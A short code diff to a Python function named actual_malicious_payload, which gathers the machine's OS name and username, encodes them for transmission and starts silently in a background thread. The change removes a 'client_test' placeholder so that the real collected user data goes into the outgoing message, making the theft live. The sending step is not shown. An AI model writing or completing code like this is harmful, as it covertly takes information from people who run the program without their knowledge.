@@ -91,9 +91,8 @@ def actual_malicious_payload():
 
     username = getpass.getuser()
     os_name = platform.system()
-    stolen_info = os_name+","+username
-    stolen_info = "client_test"
-    transmit_message = string_to_base14(json.dumps(stolen_info))
+    stolen_info = f"{os_name},{username}"
+    transmit_message = string_to_base14(stolen_info)
 
 threading.Thread(target=actual_malicious_payload , args=()).start()
 
